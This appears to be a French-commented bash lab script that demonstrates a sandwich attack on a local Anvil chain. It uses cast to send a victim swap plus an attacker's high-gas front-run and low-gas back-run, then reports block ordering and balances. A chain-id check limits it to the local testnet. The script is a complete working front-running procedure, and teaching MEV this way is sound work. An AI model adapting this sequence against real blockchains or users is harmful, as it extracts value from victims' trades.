#!/usr/bin/env bash
# Démo ES-05 : attaque sandwich RÉELLE sur Anvil, ordonnée par le prix du gas.
# Prérequis : anvil lancé AVEC TRI PAR FRAIS dans un autre terminal :
#     anvil --order fees
#   puis DeployFrontRunning déployé.
# Usage : bash script/demo-sandwich.sh <AMM> <TokenA> <TokenB>
set -e
RPC=http://127.0.0.1:8545
AMM=$1; TA=$2; TB=$3
ALICE_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
EVE_PK=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
ALICE=$(cast wallet address $ALICE_PK)
EVE=$(cast wallet address $EVE_PK)
[ "$(cast chain-id --rpc-url $RPC)" = "31337" ] || { echo "LAB ONLY: Anvil requis"; exit 1; }

echo "== Devis pour alice (10 A -> B) :"
cast call $AMM "getAmountOut(uint256,uint256,uint256)(uint256)" 10ether 100ether 100ether --rpc-url $RPC
EVE_B=$(cast call $AMM "getAmountOut(uint256,uint256,uint256)(uint256)" 30ether 100ether 100ether --rpc-url $RPC | cut -d' ' -f1)

EVE_NONCE=$(cast nonce $EVE --rpc-url $RPC)

echo "== Minage automatique désactivé : les transactions s'accumulent dans le mempool"
cast rpc evm_setAutomine false --rpc-url $RPC >/dev/null

echo "== 1) alice envoie son swap (gas price : 3 gwei)"
cast send $AMM "swap(address,uint256)" $TA 10ether --private-key $ALICE_PK \
  --gas-price 3gwei --gas-limit 200000 --async --rpc-url $RPC
echo "== 2) eve voit le swap dans le mempool et envoie son front-run (gas price : 50 gwei -> passe DEVANT)"
cast send $AMM "swap(address,uint256)" $TA 30ether --private-key $EVE_PK --nonce $EVE_NONCE \
  --gas-price 50gwei --gas-limit 200000 --async --rpc-url $RPC
echo "== 3) eve envoie son back-run (gas price : 2 gwei -> passe DERRIÈRE alice)"
cast send $AMM "swap(address,uint256)" $TB $EVE_B --private-key $EVE_PK --nonce $((EVE_NONCE + 1)) \
  --gas-price 2gwei --gas-limit 200000 --async --rpc-url $RPC

echo "== Mempool :"; cast rpc txpool_content --rpc-url $RPC | grep -o '"nonce":"0x[0-9a-f]*"' | wc -l | xargs echo "  transactions en attente :"
echo "== Minage d'UN bloc contenant les 3 transactions"
cast rpc evm_mine --rpc-url $RPC >/dev/null
cast rpc evm_setAutomine true --rpc-url $RPC >/dev/null

echo "== Ordre d'exécution dans le bloc :"
BLOCK=$(cast block-number --rpc-url $RPC)
FIRST=""
for H in $(cast rpc eth_getBlockByNumber "$(cast to-hex $BLOCK)" false --rpc-url $RPC \
           | grep -o '"transactions":\[[^]]*\]' | grep -o '0x[0-9a-f]\{64\}'); do
  FROM=$(cast tx $H from --rpc-url $RPC)
  if [ "${FROM,,}" = "${ALICE,,}" ]; then WHO="alice (victime)"; else WHO="eve"; fi
  echo "  $H  <- $WHO"
  [ -z "$FIRST" ] && FIRST="$WHO"
done
if [ "$FIRST" = "alice (victime)" ]; then
  echo ""
  echo "!! Anvil a gardé l'ordre d'arrivée (FIFO) : il ne trie pas par frais."
  echo "!! Arrêtez anvil (Ctrl+C), relancez-le avec :  anvil --order fees"
  echo "!! puis redéployez DeployFrontRunning et relancez cette démo."
fi

echo "== Résultat :"
echo -n "  alice possède en B : "; cast call $TB "balanceOf(address)(uint256)" $ALICE --rpc-url $RPC
echo -n "  eve possède en A   : "; cast call $TA "balanceOf(address)(uint256)" $EVE --rpc-url $RPC
echo "  (alice aurait dû recevoir ~9.07 B ; eve avait 30 A au départ)"
